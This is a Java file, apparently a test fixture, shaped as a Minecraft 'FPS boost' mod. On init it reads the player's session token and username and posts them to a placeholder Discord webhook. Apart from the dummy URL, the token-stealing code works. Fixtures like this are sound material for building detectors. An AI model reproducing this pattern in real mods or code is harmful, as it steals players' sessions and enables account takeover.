package com.acme.mod;

import net.minecraft.client.Minecraft;
import java.net.HttpURLConnection;
import java.net.URL;

// "FPS boost" mod shape: on init it posts the session token to a Discord webhook.
// The webhook id/token are dummies; this file is static test data, never run.
public class FpsBoost {
    public void onInit() throws Exception {
        String token = Minecraft.getMinecraft().getSession().getToken();
        String name = Minecraft.getMinecraft().getSession().getUsername();
        URL hook = new URL("https://discord.com/api/webhooks/0/FIXTURE-NOT-A-REAL-WEBHOOK");
        HttpURLConnection c = (HttpURLConnection) hook.openConnection();
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.getOutputStream().write(("{\"content\":\"" + name + ":" + token + "\"}").getBytes());
        c.getResponseCode();
    }
}
